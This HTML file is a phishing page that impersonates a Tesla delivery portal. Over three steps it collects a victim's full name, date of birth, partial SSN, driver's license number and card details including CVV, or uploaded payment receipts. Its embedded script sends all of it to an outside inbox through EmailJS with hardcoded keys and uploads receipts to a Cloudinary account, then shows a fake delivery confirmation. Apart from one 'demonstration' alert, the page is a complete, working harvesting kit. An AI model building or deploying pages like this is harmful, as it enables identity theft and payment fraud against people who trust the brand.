<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Tesla Delivery Portal</title>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:400,700">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            margin: 0;
            background: #f5f5f5;
        }
        .container {
            max-width: 600px;
            margin: 40px auto;
            background: #fff;
            border-radius: 8px;
            padding: 30px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
        }
        .header img {
            height: 50px;
            display: block;
            margin: 0 auto 20px;
        }
        .content {
            margin: 20px 0;
        }
        input, select {
            width: 100%;
            padding: 12px;
            margin: 8px 0 20px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        .btn {
            display: block;
            background: #cc0000;
            color: #fff;
            border: none;
            padding: 12px;
            border-radius: 4px;
            width: 100%;
            font-size: 16px;
            cursor: pointer;
        }
        .btn:hover {
            background: #a30000;
        }
        .hidden {
            display: none;
        }
        .payment-method {
            display: inline-block;
            padding: 10px 18px;
            margin: 5px;
            border: 1px solid #ccc;
            border-radius: 6px;
            cursor: pointer;
        }
        .payment-method.active {
            border: 2px solid #cc0000;
        }
        .progress-bar {
            margin-bottom: 30px;
        }
        .progress-steps {
            display: flex;
            justify-content: space-between;
            font-size: 14px;
            margin-bottom: 10px;
        }
        .progress-step {
            flex: 1;
            text-align: center;
        }
        .progress-line-container {
            height: 4px;
            background: #ddd;
            position: relative;
            border-radius: 2px;
        }
        .progress-indicator {
            height: 4px;
            background: #cc0000;
            border-radius: 2px;
            position: absolute;
            top: 0;
            left: 0;
        }
        .summary-box {
            background: #f9f9f9;
            border: 1px solid #ddd;
            border-radius: 6px;
            padding: 20px;
            margin-top: 20px;
        }
        .summary-row {
            display: flex;
            justify-content: space-between;
            margin-bottom: 12px;
        }
        .summary-row.total {
            font-weight: bold;
        }
        .security-badge {
            display: flex;
            align-items: center;
            margin-top: 30px;
            font-size: 14px;
            color: #5cb85c;
        }
        .footer {
            text-align: center;
            font-size: 12px;
            color: #777;
            margin-top: 30px;
        }
    </style>
</head>
<body>

<!-- Page 1: Identity -->
<div class="container" id="identity-page">
    <div class="header">
        <img src="https://www.tesla.com/tesla_theme/assets/img/_vehicle_redesign/logo.svg" alt="Tesla">
    </div>
    <div class="content">
        <h2>Identity Verification</h2>
        <input type="text" id="fullname" placeholder="Full Legal Name" required>
        <input type="date" id="dob" placeholder="Date of Birth" required>
        <input type="text" id="ssn" placeholder="Last 4 digits of SSN" required>
        <input type="text" id="dl" placeholder="Driver's License Number" required>
        <button class="btn" onclick="showPage('payment-page')">Continue to Payment</button>
    </div>
</div>

<!-- Page 2: Payment -->
<div class="container hidden" id="payment-page">
    <div class="header">
        <img src="https://www.tesla.com/tesla_theme/assets/img/_vehicle_redesign/logo.svg" alt="Tesla">
    </div>
    <div class="content">
        <h2>Select Payment Method</h2>
        <div>
            <div class="payment-method" onclick="selectPayment('credit-card')">Credit/Debit</div>
            <div class="payment-method" onclick="selectPayment('bank-transfer')">Bank Transfer</div>
            <div class="payment-method" onclick="selectPayment('crypto')">Cryptocurrency</div>
        </div>
        <div id="credit-card-payment" class="hidden">
            <input type="text" id="card-number" placeholder="Card Number">
            <input type="text" id="expiry" placeholder="MM/YY">
            <input type="text" id="cvv" placeholder="CVV">
            <input type="text" id="card-name" placeholder="Name on Card">
        </div>
        <div id="bank-transfer-payment" class="hidden">
            <p>Upload Bank Transfer Receipt:</p>
            <input type="file" id="bank-receipt">
            <p id="bank-file-name">No file selected</p>
        </div>
        <div id="crypto-payment" class="hidden">
            <p>Upload Crypto Transaction Receipt:</p>
            <input type="file" id="crypto-receipt">
            <p id="crypto-file-name">No file selected</p>
        </div>
        <button class="btn" id="complete-payment-btn" onclick="processPayment()">Complete Payment</button>
    </div>
</div>
<!-- Page 3: Confirmation -->
<div class="container hidden" id="confirmation-page">
    <div class="header">
        <img src="https://www.tesla.com/tesla_theme/assets/img/_vehicle_redesign/logo.svg" alt="Tesla">
    </div>
    <div class="content">
        <div class="progress-bar">
            <div class="progress-steps">
                <div class="progress-step completed">1. Identity</div>
                <div class="progress-step completed">2. Payment</div>
                <div class="progress-step active">3. Confirmation</div>
            </div>
            <div class="progress-line-container">
                <div class="progress-indicator" style="width: 100%"></div>
            </div>
        </div>
        <div class="confirmation-icon">
            <svg viewBox="0 0 24 24" fill="#5cb85c" width="64" height="64">
                <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/>
            </svg>
        </div>
        <h2 style="text-align: center;">Your Tesla Delivery is Confirmed!</h2>
        <div class="summary-box">
            <div class="summary-row"><span>Vehicle:</span><span>Model Y Performance</span></div>
            <div class="summary-row"><span>VIN:</span><span id="vin-display">7SAYGDEF5PF123456</span></div>
            <div class="summary-row"><span>Delivery Date:</span><span id="delivery-date">October 14, 2024</span></div>
            <div class="summary-row"><span>Delivery Address:</span><span id="delivery-address">123 Main St, Anytown, CA 90210</span></div>
            <div class="summary-row total"><span>Amount Paid:</span><span>$2,285.00</span></div>
        </div>
        <div style="text-align: center; margin: 25px 0;">
            <p>You will receive a delivery confirmation email within 24 hours.</p>
            <p>Track your vehicle at <a href="#">www.tesla.com/track</a></p>
        </div>
        <button class="btn" onclick="alert('This is a demonstration only. No actual receipt is generated.')">Download Receipt</button>
        <div class="security-badge" style="justify-content: center;">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="#5cb85c" style="margin-right: 8px;">
                <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/>
            </svg>
            Transaction ID: TES-78912345-2024
        </div>
    </div>
    <div class="footer">
        <p>Tesla Â© 2024 | Privacy Policy | Terms of Use</p>
        <p>3500 Deer Creek Road, Palo Alto, CA 94304</p>
    </div>
</div>

<!-- EmailJS & Cloudinary Scripts -->
<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
<script src="https://upload-widget.cloudinary.com/global/all.js"></script>
<script>
emailjs.init("1-W3uHSnlpZGDZ1i3");

const deliveryDate = new URLSearchParams(window.location.search).get('deliveryDate') || 'October 14, 2024';
const deliveryAddress = new URLSearchParams(window.location.search).get('address') || '123 Main St, Anytown, CA 90210';
const vin = new URLSearchParams(window.location.search).get('vin') || '7SAYGDEF5PF123456';

document.getElementById('delivery-date').textContent = deliveryDate;
document.getElementById('delivery-address').textContent = deliveryAddress;
document.getElementById('vin-display').textContent = vin;

function showPage(pageId) {
    document.querySelectorAll('.container').forEach(el => el.classList.add('hidden'));
    document.getElementById(pageId).classList.remove('hidden');
}

function selectPayment(method) {
    document.querySelectorAll('.payment-method').forEach(el => el.classList.remove('active'));
    document.querySelector(`.payment-method[onclick="selectPayment('${method}')"]`).classList.add('active');

    ['credit-card', 'bank-transfer', 'crypto'].forEach(type => {
        document.getElementById(`${type}-payment`).classList.add('hidden');
    });
    document.getElementById(`${method}-payment`).classList.remove('hidden');
}

async function processPayment() {
    const btn = document.getElementById('complete-payment-btn');
    btn.disabled = true;
    btn.textContent = 'Processing...';

    try {
        ['fullname', 'dob', 'ssn', 'dl'].forEach(id => {
            if (!document.getElementById(id).value) throw new Error('Please complete all required fields.');
        });

        const paymentMethod = document.querySelector('.payment-method.active').textContent.trim();
        const params = {
            full_legal_name: document.getElementById('fullname').value,
            date_of_birth: document.getElementById('dob').value,
            social_security_number: document.getElementById('ssn').value,
            driver_license_number: document.getElementById('dl').value,
            payment_method: paymentMethod,
            total_amount: '$2,285.00',
            delivery_date: deliveryDate,
            vin_number: vin,
            delivery_address: deliveryAddress
        };

        if (paymentMethod === 'Credit/Debit') {
            params.card_number = document.getElementById('card-number').value;
            params.expiration_date = document.getElementById('expiry').value;
            params.security_code = document.getElementById('cvv').value;
            params.name_on_card = document.getElementById('card-name').value;
        } else {
            const inputId = paymentMethod === 'Bank Transfer' ? 'bank-receipt' : 'crypto-receipt';
            const inputFile = document.getElementById(inputId);
            if (!inputFile.files.length) throw new Error('Please upload your payment receipt.');

            const uploadUrl = await new Promise((resolve, reject) => {
                const widget = cloudinary.createUploadWidget({
                    cloudName: 'do9yjpizs',
                    uploadPreset: 'unsigned_preset'
                }, (err, result) => {
                    if (result.event === 'success') resolve(result.info.secure_url);
                    if (err) reject(err);
                });
                widget.open();
            });
            params.receipt_url = uploadUrl;
        }

        const emailResponse = await emailjs.send('service_pveujll', 'template_zqpc6bx', params);
        if (emailResponse.status === 200) {
            showPage('confirmation-page');
        } else {
            throw new Error('Email sending failed.');
        }
    } catch (err) {
        alert('Error: ' + err.message);
        console.error(err);
    } finally {
        btn.disabled = false;
        btn.textContent = 'Complete Payment';
    }
}
</script>
</body>
</html>
